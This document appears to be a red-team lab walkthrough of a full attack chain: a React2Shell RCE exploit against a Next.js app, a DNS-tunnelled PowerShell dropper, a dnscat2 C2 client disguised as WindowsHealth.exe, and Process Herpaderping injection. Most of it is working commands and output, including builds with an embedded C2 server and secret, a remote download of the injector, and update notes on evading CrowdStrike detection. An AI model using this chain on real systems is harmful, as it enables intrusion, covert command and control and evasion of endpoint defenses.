# React2Shell Initial Access + dnscat2 with Herpaderping

This demo combine some repositories:

- [dnscat2 from iagox86 with a customized Golang client](https://github.com/uetsymphonique/dnscat2)
- [DNSDownloader inspired by Arno0x/DNSExfiltrator](https://github.com/uetsymphonique/file-transfer/tree/main/DNSDownloader)
- [PoC of React2Shell inspired by surajhacx/react2shellpoc and kondukto-io/vulnerable-next-js-poc](https://github.com/uetsymphonique/react2shell-poc)
- [Process Herpaderping from CyberWarFare Labs](https://github.com/uetsymphonique/Advanced-Process-Injection-Workshop/blob/master/CWLHerpaderping/description.md)

## Infrastructure

- Target: Windows machine (192.168.1.4) - Vulnerable Application: http://192.168.1.4:3000
- Attacker: Kali machine (192.168.1.2)

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ATTACK CHAIN OVERVIEW                             │
└─────────────────────────────────────────────────────────────────────────────┘

[1] Initial Access - React2Shell RCE (CVE-2025-55182)
    │
    │ Attacker exploits vulnerable Next.js application
    │ http://192.168.1.4:3000
    │
    ├─> Upload base64-encoded PowerShell dropper (DNSDownloader)
    │   via interactive_exploit.py
    │
    └─> Execute: certutil -decode out.b64 update.ps1

[2] Execution - DNS-based File Download
    │
    │ Execute update.ps1 dropper via RCE
    │
    ├─> DNS queries to 192.168.1.2:53 (test.local)
    │   - Download WindowsHealth.exe (dnscat2 client, 3.1MB, 9131 chunks)
    │   - Download CWLHerpaderping.exe (16KB, 52 chunks)
    │
    └─> Files reconstructed on target: D:\r2srce\

[3] Defense Evasion - Process Herpaderping
    │
    │ Execute: CWLHerpaderping.exe
    │
    ├─> Load malicious dnscat2 payload from C:\Temp\WindowsHealth.exe
    ├─> Create legitimate-looking process with file backing manipulation
    └─> Bypass EDR/AV detection via Process Herpaderping technique

[4] Command & Control - dnscat2 Tunnel
    │
    │ Encrypted C2 channel established
    │
    ├─> DNS tunneling to 192.168.1.2:53
    ├─> Domain: test.local
    ├─> Secret: 07d50c70b2970e2e494e34dadc283734
    └─> Interactive shell access for attacker

┌─────────────────────────────────────────────────────────────────────────────┐
│ MITRE ATT&CK Mapping                                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│ T1190 - Exploit Public-Facing Application (React2Shell RCE)                 │
│ T1105 - Ingress Tool Transfer (DNSDownloader for payload delivery)          │
│ T1071.004 - Application Layer Protocol: DNS (DNS Tunneling)                 │
│ T1027 - Obfuscated Files or Information (Encrypted DNS transfer)            │
│ T1055 - Process Injection (Process Herpaderping)                            │
│ T1036.005 - Masquerading: Match Legitimate Name (WindowsHealth.exe)         │
│ T1573.001 - Encrypted Channel: Symmetric Cryptography (dnscat2)             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Key Techniques

- **Initial Access**: Exploiting CVE-2025-55182 vulnerability in Next.js React Server Components
- **Delivery Method**: DNS-based covert channel for payload transfer, bypassing traditional file download detection
- **Defense Evasion**: Process Herpaderping technique to evade endpoint security solutions
- **C2 Channel**: Encrypted DNS tunneling for stealthy command and control communication

## Steps

### Step 1: Target - Implementing vulnerable web application (PoC of React2Shell)

```powershell
PS terminal> npm run dev

> vulnerable-nextjs-poc@1.0.0 dev
> next dev

   ▲ Next.js 16.0.6 (Turbopack)
   - Local:         http://localhost:3000
   - Network:       http://192.168.1.4:3000
   - Experiments (use with caution):
     · serverActions

 ✓ Starting...
 ✓ Ready in 1048ms
```

### Step 2: Attacker - Preparing dropper (ps1 script)

Generate base64-encoded text of ps1 script from DNSDownloader

```powershell
┌──(kali㉿kali)-[~/file-transfer/DNSDownloader]
└─$ pwsh
PowerShell 7.5.2

PS> .\New-StandalonePayload.ps1 -Domain test.local -Password mysecret -DnsServer 192.168.1.2 -Base64
[*] Generating standalone compact payload...
[+] Payload generated: payload.ps1
[*] Size: 4464 bytes (compact)

[+] Base64 payload generated:
    File: payload.txt
    Size: 5953 bytes

[+] Usage methods:
    certutil -decode payload.txt payload.ps1
    powershell -ExecutionPolicy Bypass -File payload.ps1

[+] Configuration:
    Domain    : test.local
    Password  : mysecret
    DNS Server: 192.168.1.2
    Port      : 53

[+] Usage on victim:
    powershell -ExecutionPolicy Bypass -File payload.ps1

[i] Tips:
    - No parameters needed when running
    - Test in safe environment first

```

### Step 3: Attacker - Deliver the base64-encoded text into target and decode via React2Shell RCE

Using RCE to deliver payload with `echo`

```bash
┌──(kali㉿kali)-[~/tools/react2shell-poc]
└─$ python interactive_exploit.py -t http://192.168.1.4:3000

╔══════════════════════════════════════════════════════════╗
║  CVE-2025-55182 Interactive Exploitation Shell           ║
║  React Server Components RCE                             ║
╚══════════════════════════════════════════════════════════╝

[+] Target: http://192.168.1.4:3000
[+] Type 'help' for available commands

[*] Testing connection...
[+] Connection established!

rce @ 192.168.1.4:3000 #1 > help

Built-in Commands:
  help              - Show this help message
  exit, quit        - Exit the shell
  clear             - Clear screen
  info              - Show target information
  upload <file>     - Upload base64-encoded file to target (saves as out.b64)
  download <file>   - Download file from target and save locally
  history           - Show command history

System Commands:
  Any other command will be executed on the target system

Examples:
  whoami                      - Get current user
  dir / ls                    - List directory
  type file.txt / cat file    - Read file
  powershell -c pwd           - Run PowerShell command
  upload payload.b64          - Upload file
  download package.json       - Download file

rce @ 192.168.1.4:3000 #1 >upload payload.txt
[*] Uploading payload.txt (5952 bytes)...
[+] File uploaded successfully -> out.b64
[*] Use 'certutil -decode out.b64 output.file' to decode (Windows)
rce @ 192.168.1.4:3000 #1 > dir
 Volume in drive D is New Volume
 Volume Serial Number is 4CBA-95A1

 Directory of D:\r2srce

01/10/2026  03:41 PM    <DIR>          .
01/10/2026  03:09 PM    <DIR>          ..
01/09/2026  03:35 PM                75 .gitignore
01/08/2026  02:06 PM    <DIR>          .next
01/08/2026  01:56 PM    <DIR>          app
01/08/2026  01:56 PM               180 next.config.js
01/08/2026  02:06 PM    <DIR>          node_modules
01/08/2026  01:56 PM            46,129 osv.results.json
01/10/2026  03:41 PM             5,955 out.b64
01/08/2026  02:06 PM            28,933 package-lock.json
01/08/2026  01:59 PM               366 package.json
01/09/2026  05:48 PM             5,351 README.md
              18 File(s)        258,436 bytes
               5 Dir(s)  94,518,534,144 bytes free

```

Decode ps1 dropper

```bash
rce @ 192.168.1.4:3000 #2 > certutil -decode out.b64 update.ps1
Input Length = 5955
Output Length = 4463
CertUtil: -decode command completed successfully.

rce @ 192.168.1.4:3000 #3 > type update.ps1
Add-Type -A System.IO.Compression
$Domain='test.local';$Password='mysecret';$DnsServer='192.168.1.2';$Port=53;$Output=$null;$Throttle=0;$Retries=3
...<SNIP>...

```

Update:

- After testing in environment with CrowdStrike, the command `echo "BASE64" > out.b64` used in `upload` function has been detected, so we can try the update with command `node -e "require('fs').writeFileSync('file', data)"` in `upload-node` function.
- Moreover using certutil has been also a well-known detected technique so we can use `decode` function of exploitation script.

Next update (14/01/26):
Spawning `cmd.exe` has became a telemetry to detect the React2Shell RCE so we can try to inject code execution into payload directly instead of `process.mainModule.require("child_process").execSync("COMMAND")` in the previous version of exploiting script. In detail, script has changed into `eval(String.fromCharCode(...))`, although this can't have capabilities as fully as cmd/psh, it have been still able to deliver payload and execute malicious Javascript code.

- Write: `process.mainModule.require('fs').writeFileSync('out.b64','{chunk}')`
- Append: `process.mainModule.require('fs').appendFileSync('out.b64','{chunk}')`
- Decode: `process.mainModule.require('fs').writeFileSync('{output_file}',Buffer.from(process.mainModule.require('fs').readFileSync('{input_file}','utf8').trim(),'base64'))`

### Step 4: Attacker - Weaponizing dnscat2.exe, and deliver into target via ps1 dropper

Build dnscat2.exe, CWLHerpaderping.exe and start file server

```powershell
PS terminal> msbuild CWLHerpaderping.sln /p:Configuration=Release /p:Platform=x64 /p:CustomPayloadPath="C:\\temp\\WindowsHealth.exe" /t:Rebuild
```

```bash
┌──(kali㉿kali)-[~/tools/dnscat2/go-client]
└─$ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.2 \
  -X main.DefaultSecret=07d50c70b2970e2e494e34dadc283734" \
  -o WindowsHealth.exe ./cmd/dnscat/

┌──(kali㉿kali)-[~/file-transfer/DNSDownloader]
└─$ wget https://github.com/uetsymphonique/Advanced-Process-Injection-Workshop/raw/refs/heads/master/CWLHerpaderping/x64/Release/CWLHerpaderping.exe
...<SNIP>...
Saving to: ‘CWLHerpaderping.exe’

CWLHerpaderping.exe       100%[=======================>]  16.50K  --.-KB/s    in 0.004s

2026-01-10 04:01:04 (4.57 MB/s) - ‘CWLHerpaderping.exe’ saved [16896/16896]


┌──(kali㉿kali)-[~/file-transfer/DNSDownloader]
└─$ python3 dns_server.py -d test.local -f ../../tools/dnscat2/go-client/WindowsHealth.exe -p mysecret
[*] Preparing file: ../../tools/dnscat2/go-client/WindowsHealth.exe
[*] Original file size: 3155456 bytes
[*] Compressed size: 1369537 bytes
[*] Encrypted size: 1369537 bytes
[*] Encoded size (base64url): 1826050 bytes
[+] File prepared: 9131 chunks of ~200 bytes
[+] DNS server listening on port 53
[*] Domain: test.local
[*] Serving file: WindowsHealth.exe (9131 chunks)
[*] Waiting for download requests...
<SNIP>

┌──(kali㉿kali)-[~/file-transfer/DNSDownloader]
└─$ python3 dns_server.py -d test.local -f CWLHerpaderping.exe -p mysecret
[*] Preparing file: CWLHerpaderping.exe
[*] Original file size: 16896 bytes
[*] Compressed size: 7669 bytes
[*] Encrypted size: 7669 bytes
[*] Encoded size (base64url): 10226 bytes
[+] File prepared: 52 chunks of ~200 bytes
[+] DNS server listening on port 53
[*] Domain: test.local
[*] Serving file: CWLHerpaderping.exe (52 chunks)
[*] Waiting for download requests...
<SNIP>
```

Invoke dropper with RCE

```bash
rce @ 192.168.1.4:3000 #1 > timeout 1800
[+] Timeout changed: 15s -> 1800s
rce @ 192.168.1.4:3000 #1 > powershell -File update.ps1
[*] DNS Downloader
[+] WindowsHealth.exe (9131 chunks, base64url)
[*] Decode...
[*] Decrypt...
[*] Unzip...
[+] Checksum OK
[+] Saved: WindowsHealth.exe (3155456 bytes)
rce @ 192.168.1.4:3000 #2 > copy WindowsHealth.exe C:\\Temp
        1 file(s) copied.

rce @ 192.168.1.4:3000 #3 > powershell -File update.ps1
[*] DNS Downloader
[+] CWLHerpaderping.exe (52 chunks, base64url)
[*] Decode...
[*] Decrypt...
[*] Unzip...
[+] Checksum OK
[+] Saved: CWLHerpaderping.exe (16896 bytes)
```

Update (14/01/26):
Spawning `cmd.exe` has became a telemetry to detect the React2Shell RCE so we can try to inject code execution into payload directly instead of `process.mainModule.require("child_process").execSync("COMMAND")` in the previous version of exploiting script. In detail, script has changed into `eval(String.fromCharCode(...))`, although this can't have capabilities as fully as cmd/psh, it have been still able to deliver payload, copy file (`process.mainModule.require('fs').copyFileSync('{source_file}','{dest_file}')`) and execute malicious Javascript code.

### Step 5: Attacker - Prepare C2 server and Run the Process Injection payload

```bash

┌──(kali㉿kali)-[~/tools/dnscat2/server]
└─$ sudo ruby dnscat2.rb --dns host=192.168.1.2,port=53,domain=test.local --no-cache --secret=07d50c70b2970e2e494e34dadc283734
[sudo] password for kali:

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted and authenticated
New window created: dns1
Starting Dnscat2 DNS server on 192.168.1.2:53
[domains = test.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=07d50c70b2970e2e494e34dadc283734 test.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=07d50c70b2970e2e494e34dadc283734

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```

```bash
rce @ 192.168.1.4:3000 #16 > CWLHerpaderping.exe
```

Update (14/01/26):
The old execution via `cmd.exe` mentioned above has been replaced by:

```javascript
var cp = process.mainModule.require("child_process");
var res = cp.spawnSync("malware.exe", ["arg1"], {
  shell: false,
  encoding: "utf8",
});
```
